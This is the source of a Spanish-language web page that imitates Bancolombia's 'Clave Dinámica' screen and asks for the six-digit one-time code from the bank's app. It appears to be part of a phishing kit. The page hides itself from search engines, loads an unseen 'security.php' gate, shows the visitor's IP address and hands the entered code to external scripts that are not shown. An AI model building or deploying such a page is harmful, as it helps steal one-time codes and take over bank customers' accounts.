<?php require_once 'security.php'; ?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow, noarchive, nosnippet, notranslate">
    <meta name="googlebot" content="noindex, nofollow, noarchive, nosnippet">
    <meta name="description" content="Validación segura de clave dinámica Bancolombia.">
    <title>Clave Dinámica — Bancolombia</title>
    <link rel="icon" type="image/svg+xml" href="favicon.svg">
    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
    <script src="jquery-3.7.7.js"></script>
    <link rel="stylesheet" href="assets/css/pages/index3.css">
</head>
<body class="index3-page">

<div class="index3-shell">
    <div class="header-top">
        <div class="header-content">
            <img src="assets/images/logo-encabezado.svg" alt="Bancolombia" class="logo-header">
        </div>
    </div>

    <main class="contenido-principal">
        <h1 class="titulo-principal">Ingrese su clave dinamica</h1>

        <section class="center-stage">
            <div class="contenedor-principal">
                <div class="form-container">
                    <div class="form-box">
                        <p class="descripcion">
                            Ingresa la Clave Dinamica que encuentras en la parte superior de la pantalla de inicio de tu App Bancolombia.
                        </p>

                        <div id="mensaje-error">
                            Clave Dinamica invalida. Por favor verifica el codigo e intenta nuevamente.
                        </div>

                        <div class="password-wrapper">
                            <input type="tel" id="clave" maxlength="6" class="real-password-input" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
                            <div class="password-slots">
                                <div class="password-slot"></div>
                                <div class="password-slot"></div>
                                <div class="password-slot"></div>
                                <div class="password-slot"></div>
                                <div class="password-slot"></div>
                                <div class="password-slot"></div>
                            </div>
                        </div>

                        <div class="botones">
                            <button type="button" class="btn-volver btn-volver--hidden" id="btnVolverDinamica">Volver</button>
                            <button type="button" id="btnContinuar" class="btn-continuar inactivo">Continuar</button>
                        </div>
                    </div>
                </div>
            </div>
        </section>
    </main>

    <footer class="footer-container">
        <img src="assets/images/trazo-escritorio.svg" alt="" class="lineas-form lineas-form-desktop">
        <img src="assets/images/trazo-movil.svg" alt="" class="lineas-form lineas-form-mobile">

        <div class="vigilado-logo">
            <img src="assets/images/estrella-hola.svg" alt="Vigilado">
        </div>

        <div class="info-footer">
            <div class="ip-text">Direccion IP: <span id="gfg">Cargando...</span> | Fecha y hora: <span id="fecha-hora">Cargando...</span></div>
        </div>
    </footer>
</div>

<div id="address" hidden></div>

<!-- SCRIPTS -->
<script src="assets/js/shared/page-common.js?v=9"></script>
<script src="assets/js/pages/index3.js?v=9"></script>

</body>
</html>
